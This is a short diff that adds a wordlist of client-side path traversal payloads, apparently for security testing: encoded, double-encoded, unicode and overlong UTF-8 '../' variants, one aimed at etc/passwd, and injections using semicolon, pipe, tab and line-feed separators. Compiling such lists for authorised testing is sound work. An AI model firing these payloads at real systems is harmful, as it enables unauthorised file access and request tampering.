@@ -1,0 +1,31 @@
+test cspt sink
+%2F%2E%2E%2Ftest
+%252F%252E%252E%252Ftest
+
+%2F%252E%252E%2Ftest
+
+%5C..%5Ctest
+%255C..%255Ctest
+
+unicode bypass
+kukdd0-awtttt%u002f..%u002ftest
+kukdd0-awtttt%25u002f..%25u002ftest
+
+New bypass 
+../
+....//
+....\\
+\\\....//
+
+
+%u002f..%u002ftest          # Unicode bypass
+%c0%af..%c0%afetc%2fpasswd  # Overlong UTF-8
+./..//test                  # Dot-slash mixing  
+%2f.%2f..%2ftest            # Dot normalization
+
+
+kukdd0-awtttt;../test
+kukdd0-awtttt,../test  
+kukdd0-awtttt|../test
+kukdd0-awtttt%09../test    # Tab
+kukdd0-awtttt%0a../test    # LF
